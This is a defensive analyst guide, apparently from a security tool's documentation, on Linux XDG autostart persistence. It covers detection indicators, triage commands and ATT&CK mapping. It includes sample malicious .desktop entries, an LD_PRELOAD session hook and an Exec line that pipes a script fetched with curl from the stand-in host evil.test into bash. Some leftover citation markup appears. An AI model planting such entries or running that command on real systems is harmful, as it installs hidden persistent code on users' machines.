# Autostart Hook Persistence

## Overview

Autostart hook persistence refers to abuse of user-session and desktop-environment startup mechanisms that automatically launch programs when a user logs in.

On Linux, the most important and widely standardized version of this is **XDG autostart**, which uses `.desktop` files to define applications that launch automatically when the desktop session initializes. System-wide autostart entries are commonly stored in:

- `/etc/xdg/autostart/`

User-specific autostart entries are commonly stored in:

- `~/.config/autostart/`

Beyond XDG autostart, closely related user-session startup surfaces may include:

- `~/.config/systemd/user/`
- `~/.config/environment.d/`
- `~/.pam_environment`

These are not identical mechanisms, but they share a common analytical theme:

> **They turn user logon or session initialization into an execution trigger.**

Unlike cron or systemd system services, autostart persistence usually executes in the context of the logged-in user and is often designed to blend into normal desktop/session behavior rather than core operating system startup.

---

## Why Attackers Use Autostart Hooks for Persistence

Attackers use autostart hooks because they provide:

- Reliable execution at user logon  
- No requirement for a continuously running service  
- A user-context execution model that may avoid some privileged-monitoring controls  
- Easy masquerading as legitimate desktop helpers, updaters, or tray applications  
- Strong compatibility with phishing, initial user compromise, and post-compromise footholds  

Autostart persistence is especially attractive on:

- workstations
- laptops
- VDI systems
- Linux desktops used by administrators or developers

It is less valuable on headless servers with no graphical login flow, which is an important analytical distinction.

---

## Execution Semantics

The most important autostart mechanism in Linux desktop environments is the XDG autostart specification, which uses `.desktop` files to launch applications at login.

A typical malicious or benign autostart entry may contain:

```ini
[Desktop Entry]
Type=Application
Name=GNOME Update
Exec=/tmp/dbus-update
Hidden=false
X-GNOME-Autostart-enabled=true
```

### Core Fields Analysts Should Understand

- `Type=Application`  
  Indicates an application should be launched

- `Name=`  
  The display name shown to users or tools

- `Exec=`  
  The command or path that will actually execute

- `Hidden=`  
  Can suppress or disable presentation depending on usage and implementation

- `X-GNOME-Autostart-enabled=`  
  Commonly used in GNOME-compatible environments to control autostart behavior

### Execution Context

Autostart hooks usually execute:

- at user logon
- within the user’s desktop session
- under the user’s privileges

That means they often persist access or execution **without requiring root**.

---

## Privilege Requirements

### User-Level Persistence

A compromised user account can generally create or modify:

```text
~/.config/autostart/
```

This is enough to create per-user autostart persistence in XDG-compliant environments.

### System-Level Persistence

An attacker with elevated privileges can modify:

```text
/etc/xdg/autostart/
```

This broadens scope significantly because it can affect multiple users depending on desktop/session behavior.

---

## Why This Mechanism Is So Effective

Autostart persistence is effective because it hides inside a normal user event:

- the user logs in
- the desktop environment initializes
- expected helper applications launch
- malicious code launches with them

This makes it powerful for the same reason shell-profile persistence is powerful:

> The user becomes the trigger.

But autostart entries often provide a cleaner, more application-like persistence mechanism than shell profiles because they can appear to be:

- update helpers
- desktop notifications
- tray daemons
- session restore components
- vendor tools

That makes them especially useful for masquerading.

---

## Common Attacker Tradecraft

### 1. User-Level XDG Autostart Entry Pointing to a Temporary Payload

Target file:

```text
~/.config/autostart/gnome-update.desktop
```

Example contents:

```ini
[Desktop Entry]
Type=Application
Name=GNOME Update
Exec=/tmp/dbus-update
Hidden=false
X-GNOME-Autostart-enabled=true
```

Execution flow:
1. Attacker gains access to user account  
2. Drops malicious `.desktop` file in the user autostart directory  
3. Stages payload at `/tmp/dbus-update`  
4. User logs in  
5. Desktop environment launches the payload automatically  

Why attackers use this:
- No root required  
- Extremely simple deployment  
- Easy to masquerade as a desktop component or updater  

---

### 2. System-Wide XDG Autostart Entry Affecting Multiple Users

Target file:

```text
/etc/xdg/autostart/network-update.desktop
```

Example contents:

```ini
[Desktop Entry]
Type=Application
Name=Network Update
Exec=/usr/local/bin/.netupd
Hidden=false
X-GNOME-Autostart-enabled=true
```

Execution flow:
1. Attacker gains root access  
2. Writes a system-wide `.desktop` autostart entry  
3. Places payload in `/usr/local/bin/.netupd`  
4. Users log in  
5. Payload launches automatically across affected sessions  

Why attackers use this:
- Broad scope  
- Strong persistence across users  
- Looks like a legitimate administrative or vendor helper  

---

### 3. Inline Shell Execution in the `Exec` Directive

Target file:

```text
~/.config/autostart/session-update.desktop
```

Example contents:

```ini
[Desktop Entry]
Type=Application
Name=Session Update
Exec=/bin/bash -c "curl http://evil.test/payload.sh | bash"
Hidden=false
X-GNOME-Autostart-enabled=true
```

Execution flow:
1. Attacker plants malicious autostart entry  
2. User logs in  
3. Desktop environment processes `.desktop` file  
4. `Exec` line launches shell  
5. Remote payload is fetched and executed  

Why attackers use this:
- No second-stage file required at rest  
- Payload can be changed remotely  
- Minimal local artifact complexity  

---

### 4. Hidden or Masqueraded Entry Name

Target file:

```text
~/.config/autostart/dbus-helper.desktop
```

Example contents:

```ini
[Desktop Entry]
Type=Application
Name=DBus Helper
Exec=/home/user/.local/bin/dbus-helper
Hidden=false
X-GNOME-Autostart-enabled=true
```

Execution flow:
1. Attacker chooses a plausible service-like name  
2. Places payload in a user-controlled path  
3. User logs in  
4. Autostart entry launches quietly during session initialization  

Why attackers use this:
- The file and name look plausible to casual reviewers  
- Helps blend into legitimate desktop startup noise  
- Avoids obviously malicious names like `backdoor.desktop`  

---

### 5. User-Context Autostart via `~/.config/systemd/user/`

Target file:

```text
~/.config/systemd/user/dbus-update.service
```

Example contents:

```ini
[Unit]
Description=DBus Update

[Service]
Type=simple
ExecStart=/home/user/.local/bin/dbus-update

[Install]
WantedBy=default.target
```

Execution flow:
1. Attacker gains access to user profile  
2. Writes user-level systemd unit  
3. Enables or relies on user session service behavior  
4. User logs in and user service manager initializes  
5. Payload launches inside user session context  

Why attackers use this:
- More flexible than simple `.desktop` files  
- Behaves like a legitimate session service  
- Good for long-running user-space implants  

---

### 6. Environment-Based Session Hook Chained to Autostart Behavior

Target file:

```text
~/.config/environment.d/90-session.conf
```

Example contents:

```text
LD_PRELOAD=/home/user/.cache/libnotify.so
```

Execution flow:
1. Attacker writes session environment hook  
2. User session initializes  
3. Environment is applied to compatible processes  
4. Target applications load attacker-controlled shared object  

Why attackers use this:
- More subtle than obvious `.desktop` launcher abuse  
- Can support execution hijacking rather than simple process launch  
- Pairs well with session-based persistence goals  

---

### 7. Hidden Binary in User-Controlled Path

Target file:

```text
~/.config/autostart/backup-monitor.desktop
```

Example contents:

```ini
[Desktop Entry]
Type=Application
Name=Backup Monitor
Exec=/home/user/.config/.cache/backup-monitor
Hidden=false
X-GNOME-Autostart-enabled=true
```

Execution flow:
1. Attacker stores binary in hidden user-controlled path  
2. Autostart entry references that hidden binary  
3. User logs in  
4. Payload launches as if it were a normal desktop helper  

Why attackers use this:
- Keeps payload outside obvious service or package paths  
- Lets attacker rename binary freely  
- Blends into dense user configuration trees  

---

### 8. Layered Persistence Through Autostart Hooks

Example chain:
- `.desktop` file executes at login
- launched binary restores cron or SSH persistence
- launched binary re-stages payload in `/tmp`
- launched binary opens C2 session

Execution flow:
1. User logs in  
2. Autostart entry launches attacker-controlled program  
3. Program recreates or validates other persistence layers  
4. Attacker regains redundancy and resilience  

Why attackers use this:
- Autostart becomes the first-stage login foothold  
- Secondary persistence can be restored automatically  
- Analyst cleanup must remove both trigger and payload chain  

---

## What Normal Looks Like

File:

```text
/etc/xdg/autostart/org.gnome.SettingsDaemon.Power.desktop
```

Contents:

```ini
[Desktop Entry]
Type=Application
Name=Power Manager
Exec=/usr/libexec/gsd-power
OnlyShowIn=GNOME;
NoDisplay=true
X-GNOME-Autostart-Phase=Initialization
X-GNOME-Autostart-enabled=true
```

Legitimate autostart behavior usually involves:

- desktop helper applications
- accessibility tools
- vendor tray applications
- package-managed update agents
- session restore components

Normal entries generally:
- use expected names
- reference trusted installation paths
- belong to known software
- are consistent with the user’s desktop environment and installed packages

Examples of plausible locations:
- `/usr/bin/...`
- `/usr/lib/...`
- package-managed helper paths

---

## What Malicious Use Looks Like

### High-Signal Indicators

- `Exec=` references:
  - `/tmp`
  - `/var/tmp`
  - `/dev/shm`
  - hidden files in user directories
- autostart entry names designed to mimic:
  - updates
  - session components
  - DBus helpers
  - network tools
- `Exec=` using:
  - `bash -c`
  - `sh -c`
  - `curl`
  - `wget`
- recently created `.desktop` files in autostart paths
- entries not associated with installed packages

MITRE’s XDG Autostart guidance specifically calls out suspicious `Exec` paths and anomalous names in `/etc/xdg/autostart` and `~/.config/autostart` as useful detection points. :contentReference[oaicite:1]{index=1}

### Medium-Signal Indicators

- hidden payload paths under user home directories
- unusual autostart entries on systems without clear desktop usage
- user-level systemd services with suspicious paths

### Low-Signal Indicators

- legitimate desktop restore behavior
- vendor software tray apps
- expected conferencing, printing, sync, or update tools

---

## ATT&CK Mapping

The strongest ATT&CK relationship for this category is:

- **T1547.013 – XDG Autostart Entries**

MITRE defines this as adversaries adding or modifying XDG autostart entries to execute malicious programs or commands when a user’s desktop environment loads at login. :contentReference[oaicite:2]{index=2}

Depending on the exact implementation, related session-hook behavior may also overlap broader boot/logon autostart or execution-hijack concepts.

---

## Why Analysts Miss This Technique

### 1. It Is User-Session Scoped

Many responders focus on system boot and service persistence, not desktop login persistence.

### 2. `.desktop` Files Look Benign

They are common, human-readable, and often mistaken for harmless UI metadata.

### 3. The Entry May Look Like a Real Application

Attackers frequently choose names that sound operationally plausible.

### 4. Headless-Server Bias

Analysts working mostly on servers may forget this is highly relevant on Linux workstations, laptops, and admin desktops.

---

## Deep Analytical Guidance

### Key Question

> Does this autostart entry launch something that genuinely belongs in the user’s login session?

That is the right question.

The wrong question is:

> Is this just a `.desktop` file?

Plenty of `.desktop` files are normal. The important issue is:

- what the `Exec` path launches
- whether the path is trusted
- whether the entry aligns with the software inventory and host role

---

### Focus Areas

#### 1. `Exec` Path Trustworthiness

Ask:
- Is the target package-managed?
- Is it hidden?
- Is it user-writable?
- Is it in a temporary or unusual directory?

#### 2. Naming and Masquerading

Does the entry name:
- imitate a legitimate component?
- look generic enough to avoid notice?
- align with installed software?

#### 3. Scope

Is it:
- per-user
- system-wide
- session-service based
- environment-hook assisted

#### 4. Session Relevance

Is this host actually using a desktop environment where XDG autostart matters?

This is important because an autostart entry on a headless host may be inert, whereas the same entry on a GNOME workstation is highly relevant.

#### 5. Chaining

Does the autostart target:
- fetch remote payloads
- restore other persistence
- establish C2
- launch hidden background binaries

---

## Triage Workflow

1. Inspect XDG autostart paths:

```text
ls -la /etc/xdg/autostart
ls -la ~/.config/autostart
```

2. Inspect suspicious `.desktop` files:

```text
cat /etc/xdg/autostart/<file>.desktop
cat ~/.config/autostart/<file>.desktop
```

3. Review `Exec=` directives carefully

4. Validate referenced binaries or scripts

5. Check file metadata:

```text
stat /etc/xdg/autostart/*
stat ~/.config/autostart/*
```

6. Correlate with:
- user logon timing
- process creation after session start
- package ownership
- network activity from autostarted processes

MITRE’s detection guidance also recommends correlating file creation/modification of `.desktop` files with process execution at user login. :contentReference[oaicite:3]{index=3}

---

## Evidence to Preserve

- `/etc/xdg/autostart/*`
- `~/.config/autostart/*`
- referenced payload files
- user-level session service definitions if relevant
- session environment hooks if involved
- file metadata (timestamps, ownership, permissions)
- package ownership information when available
- process and network telemetry associated with login-time execution

---

## False Positive Reduction

To reduce false positives, analysts should ask:

- Is this a desktop system where autostart entries are expected?
- Does this entry correspond to installed software?
- Is the `Exec` path trusted and package-managed?
- Does the name align with actual application inventory?
- Was the file created recently or outside normal software installation activity?

A `.desktop` file in `/etc/xdg/autostart` is not inherently suspicious.  
A `.desktop` file in `~/.config/autostart` named `GNOME Update` that launches `/tmp/dbus-update` is a very different matter.

---

## Why Tenax Checks This Surface

Tenax checks autostart hooks because they are:

- true persistence mechanisms
- highly relevant on Linux desktop and admin systems
- easy to masquerade
- often missed by analysts focused only on services and schedulers

Autostart persistence is especially valuable in incidents involving:
- user workstation compromise
- developer workstation compromise
- admin desktop compromise
- phishing-to-persistence workflows

> Autostart hooks do not survive by being noisy.  
> They survive by looking like something the desktop was going to launch anyway.

---

## Key Takeaway

Autostart hook persistence is login-time execution hidden inside normal session initialization behavior.

The attacker does not need to create a visibly suspicious service or scheduled job.

> They only need to ensure that when the user’s desktop comes to life, their code comes with it.
